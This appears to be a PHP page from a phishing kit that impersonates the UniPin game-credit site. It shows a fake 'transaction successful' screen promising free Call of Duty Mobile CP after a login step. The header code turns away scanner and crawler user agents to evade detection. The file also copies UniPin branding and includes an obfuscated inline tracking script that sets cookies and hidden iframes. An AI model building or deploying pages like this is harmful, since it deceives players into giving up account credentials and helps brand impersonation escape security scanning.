<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://web.facebook.com/MhmdDhanzGans');
die();
}

session_start();
if(!isset($_SESSION['login'])) {
    header('location: ../../');
    exit();
} else {
    if(isset($_SESSION['login']) != "Login") {
        header('location: ../../');
        exit();
    } else {
        include"transaksi.php";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta content="yes" name="apple-mobile-web-app-capable"/>
    <meta name="viewport" content="minimum-scale=1.0, width=device-width, maximum-scale=1, user-scalable=no"/>

    <title>UniPin - Sukses</title>

    <meta name='application-name' content='UniPin'/>
    <meta name="copyright" content="&copy; 2019 by UniPin">
    <meta name='keywords' content="payment gateway, payment service provider, online game, indomaret, game credits, game cash ">
    <meta name='description' content="The fastest way to get game credits online! ">
    <link rel="icon" type="image/x-icon" href="https://www.unipin.com/img/favicon.ico"/>

    <link href="../../css/app.v2.css?id=f94fa96a449ed2e042c6" rel="stylesheet" type="text/css"/>
    
    
            <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-81857948-3"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-81857948-3');
</script>


<!-- Facebook Pixel Code -->

<!-- End Facebook Pixel Code -->    
    
</head>
<body>
        <div style='display:none' id='sbbhscc'></div>
          <script type="text/javascript">
            var sbbvscc='';
            var sbbgscc='';
            function genPid() {return String.fromCharCode(108)+String.fromCharCode(85) ; };
          </script>
        <div id='sbbfrcc' style='position: absolute; top: -10px; left: 30px; font-size:1px'></div>
  <script type="text/javascript">(function(XHR){var open=XHR.prototype.open;var send=XHR.prototype.send;var parser=document.createElement('a');XHR.prototype.open=function(method, url, async, user, pass){if(typeof async=='undefined'){async=true;}parser.href=url;if(parser.host==''){parser.href=parser.href;}this.ajax_hostname=parser.hostname;open.call(this, method, url, async, user, pass);};XHR.prototype.send=function(data){if(location.hostname==this.ajax_hostname)this.setRequestHeader("X-MOD-SBB-CTYPE", "xhr");send.call(this, data);}})(XMLHttpRequest);if(typeof(fetch)!="undefined"){var nsbbfetch=fetch;fetch=function(url, init){if(typeof(url)==="object" && typeof(url.url)==="string"){url=url.url;}function sbbSd(url, domain){var parser=document.createElement('a');parser.href=url;if(parser.host==''){parser.href=parser.href;}return parser.hostname==location.hostname;}if(sbbSd(url, document.domain)){init=typeof init !=='undefined' ? init :{};if(typeof(init.headers)==="undefined"){init.headers={};}init.headers['X-MOD-SBB-CTYPE']='fetch';}return nsbbfetch(url, init);};}function sbbgc(check_name){var start=document.cookie.indexOf(check_name+"=");var oVal='';var len=start+check_name.length+1;if((!start)&&(document.cookie.substring(0,check_name.length)!=check_name)){oVal='';}else if(start==-1){oVal='';}else{var end=document.cookie.indexOf(';',len);if(end==-1)end=document.cookie.length;var oVal=document.cookie.substring(len,end);};return oVal;}function addmg(inm,ext){var primgobj=document.createElement('IMG');primgobj.src=window.location.protocol+"//"+window.location.hostname+(window.location.port && window.location.port!=80 ? ':'+window.location.port: '')+"/sbbi/?sbbpg="+inm+(ext?"&"+ext:"");var sbbDiv=document.getElementById('sbbfrcc');sbbDiv.appendChild(primgobj);};function addprid(prid){var oldVal=sbbgc("PRLST");if((oldVal.indexOf(prid)==-1)&&(oldVal.split('/').length<5)){if(oldVal!='')oldVal+='/';document.cookie='PRLST='+oldVal+escape(prid)+';path=/';}}var sbbeccf=function(){this.sp3="jass";this.sf1=function(vd){return sf2(vd)+32;};var sf2=function(avd){return avd*12;};this.sf4=function(yavd){return yavd+2;};var strrp=function(str, key, value){if(str.indexOf('&'+key+'=')> -1 || str.indexOf(key+'=')==0){var idx=str.indexOf('&'+key+'=');if(idx==-1)idx=str.indexOf(key+'=');var end=str.indexOf('&', idx+1);var newstr;if(end !=-1)newstr=str.substr(0, idx)+str.substr(end+(idx ? 0 : 1))+'&'+key+'='+value;else newstr=str.substr(0, idx)+'&'+key+'='+value;return newstr;}else return str+'&'+key+'='+value;};var strgt=function(name, text){if(typeof text !='string')return "";var nameEQ=name+"=";var ca=text.split(/[;&]/);for(var i=0;i < ca.length;i++){var c=ca[i];while(c.charAt(0)==' ')c=c.substring(1, c.length);if(c.indexOf(nameEQ)==0)return c.substring(nameEQ.length, c.length);}return "";};this.sfecgs={sbbgh:function(){var domain=document.location.host;if(domain.indexOf('www.')==0)domain=domain.replace('www.', '');return domain;}, f:function(name, value){var fv="";if(window.globalStorage){var host=this.sbbgh();try{if(typeof(value)!="undefined")globalStorage[host][name]=value;else{fv=globalStorage[host][name];if(typeof(fv.toString)!="undefined")fv=fv.toString();}}catch(e){}}return fv;}, name:"sbbrf"};this.sfecls={f:function(name, value){var fv="";try{if(window.localStorage){if(typeof(value)!="undefined")localStorage.setItem(name, value);else{fv=localStorage.getItem(name);if(typeof(fv.toString)!="undefined")fv=fv.toString();}}}catch(e){}return fv;}, name:"sbbrf"};this.sbbcv=function(invl){try{var invalArr=invl.split("-");if(invalArr.length>1){if(invalArr[0]=="A"||invalArr[0]=="D"){invl=invalArr[1];}else invl="";}if(invl==null||typeof(invl)=="undefined"||invl=="falseImgUT"||invl=="undefined"||invl=="null"||invl!=encodeURI(invl))invl="";if(typeof(invl).toLowerCase()=="string")if(invl.length>20)if(invl.substr(0,2)!="h4")invl="";}catch(ex){invl="";}return invl;};this.sbbsv=function(fv){for(var elm in this){if(this[elm].name=="sbbrf"){this[elm].f("altutgv2",fv);}}document.cookie="UTGv2="+fv+';expires=Tue, 31 Dec 2030 00:00:00 UTC;path=/';};this.sbbgv=function(){var valArr=Array();var currVal="";for(var elm in this){if(this[elm].name=="sbbrf"){currVal=this[elm].f("altutgv2");currVal=this.sbbcv(currVal);if(currVal!="")valArr[currVal]=(typeof(valArr[currVal])!="undefined"?valArr[currVal]+1:1);}}var lb=0;var fv="";for(var val in valArr){if(valArr[val]>lb){fv=val;lb=valArr[val]}}if(fv=="")fv=sbbgc("UTGv2");fv=this.sbbcv(fv);if(fv!="")this.sbbsv(fv);else this.sbbsv("h40005ed321b7d394e641c41eb5abfb64060");return fv;};};function m2vr(m1,m2){var i=0;var rc="";var est="ghijklmnopqrstuvwyz";var rnum;var rpl;var charm1=m1.charAt(i);var charm2=m2.charAt(i);while(charm1!=""||charm2!=""){rnum=Math.floor(Math.random()* est.length);rpl=est.substring(rnum,rnum+1);rc+=(charm1==""?rpl:charm1)+(charm2==""?rpl:charm2);i++;charm1=m1.charAt(i);charm2=m2.charAt(i);}return rc;}function sbbls(prid){try{var eut=sbbgc("UTGv2");window.sbbeccfi=new sbbeccf();window.sbbgs=sbbeccfi.sbbgv();if(eut!=sbbgs && sbbgs!="" && typeof(sbbfcr)=="undefined"){addmg('utMedia',"vii="+m2vr("64b2185a2cdf981269dfef7880240235",sbbgs));}var sbbiframeObj=document.createElement('IFRAME');var dfx=new Date();sbbiframeObj.id='SBBCrossIframe';sbbiframeObj.title='SBBCrossIframe';sbbiframeObj.tabindex='-1';sbbiframeObj.lang='en';sbbiframeObj.style.visibility='hidden';sbbiframeObj.setAttribute('aria-hidden', 'true');sbbiframeObj.style.border='0px';if(document.all){sbbiframeObj.style.position='absolute';sbbiframeObj.style.top='-1px';sbbiframeObj.style.height='1px';sbbiframeObj.style.width='28px';}else{sbbiframeObj.style.height='1px';sbbiframeObj.style.width='0px';}sbbiframeObj.scrolling="NO";sbbiframeObj.src=window.location.protocol+"//"+window.location.hostname+(window.location.port && window.location.port!=80 ? ':'+window.location.port: '')+'/sbbi/?sbbpg=sbbShell&gprid='+prid+'';var sbbDiv=document.getElementById('sbbfrcc');sbbDiv.appendChild(sbbiframeObj);}catch(ex){;}}try{var y=unescape(sbbvscc.replace(/^<\!\-\-\s*|\s*\-\->$/g,''));document.getElementById('sbbhscc').innerHTML=y;var x=unescape(sbbgscc.replace(/^<\!\-\-\s*|\s*\-\->$/g,''));}catch(e){x='function genPid(){return "jser";}';}try{if(window.gprid==undefined)document.write('<'+'script type="text/javascri'+'pt">'+x+"var gprid=genPid();addprid(gprid);var sbbfcr=true;sbbls(gprid);<"+"/script>");}catch(e){addprid("dwer");}</script>
    <section>
        <div class="container" style="width: 500px; max-width: 90%; display: block; margin: 20px auto; border: 1px solid yellow; border-radius: 4px;">
            <div class="col-lg-12 border" style="display: block; margin: 10px auto; background: #f9f9f9;">
                <h3 align="center" style="border-bottom: 2px solid #dddddd;padding-bottom: 10px;margin-bottom: 5px; color: green;">Transaksi Sukses</h3>
                <div class="col-xs-12 text-center" style="padding: 0;">
        <div class="validationSuccess" style="border-bottom: 2px solid #dddddd;">
            <div class="alert" role="alert" style="text-align: left; margin: 10px auto -20px auto;">
                Nomor Transaksi<br/><b style="font-size: 1em;">S<?php echo notranskasi();?></b>
            </div>
            <div class="alert" role="alert" style="text-align: left; margin: 10px auto -20px auto;">
                Referensi<br/><b style="font-size: 1em;"><?php echo noreferensi();?></b>
            </div>
            <div class="alert" role="alert" style="text-align: left; margin: 10px auto -20px auto;">
                Nominal Transaksi<br/><b style="font-size: 1em;">IDR 0 - FREE</b>
            </div>
            <div class="alert" role="alert" style="text-align: left; margin: 10px auto -20px auto;">
                Item<br/><b style="font-size: 1em;">CP Call of Duty Mobile</b>
            </div>
            <div class="alert" role="alert" style="text-align: left; margin: 10px auto 10px auto;">
                Nama Pengguna<br/><b style="font-size: 1em;"><?php echo nopengguna();?></b>
            </div>

        </div>
        <div class="alert" role="alert" style="text-align: center; margin: 10px auto;">
                Anda bebas untuk menutup jendela pop-up sekarang<p><br> 
                <button onclick="location.href='../../';" style="width: 100px; background: none; border: 2px solid #dddddd; outline: none; padding: 8px 5px; border-radius: 48px; outline: none;">Tutup</button>
            </div>
    </div>

            </div>
        </div>
    </section>
<script src="../../js/app.v2.js?id=a2e1541c6e50f011a361" type="text/javascript"></script>
<!-- jquery validate localization-->
    <script src="https://www.unipin.com/js/jquery-validate/localization/messages_id.js" type="text/javascript"></script>
<!-- end jquery validate localization-->
<script>
    jQuery.validator.setDefaults({
        submitHandler: function(form) {
            $(form).find('input[type=submit]').prop("disabled", true);
            $(form).find('input[type=submit]').val("Mengolah...");
            $("body").css("cursor", "progress");
            form.submit();
        },
        errorClass: 'input-error'
    });

    $('.input-date').datetimepicker({
        format: 'DD/MM/YYYY'
    });

    $('.input-time').datetimepicker({
        format: 'HH:mm'
    });

    if ( $( ".autotab-number" ).length ) {
        $('.autotab-number').autotab('number');
    }

    $(document).ready(function () {
        $('[data-toggle="tooltip"]').tooltip({
            content: function () {
                return this.getAttribute("title");
            },
            animated: 'fade',
            html: true
        });

        $.jGrowl.defaults.closerTemplate = '<div>sembunyikan semua notifikasi</div>';

        
            });
</script>
</body>
</html>
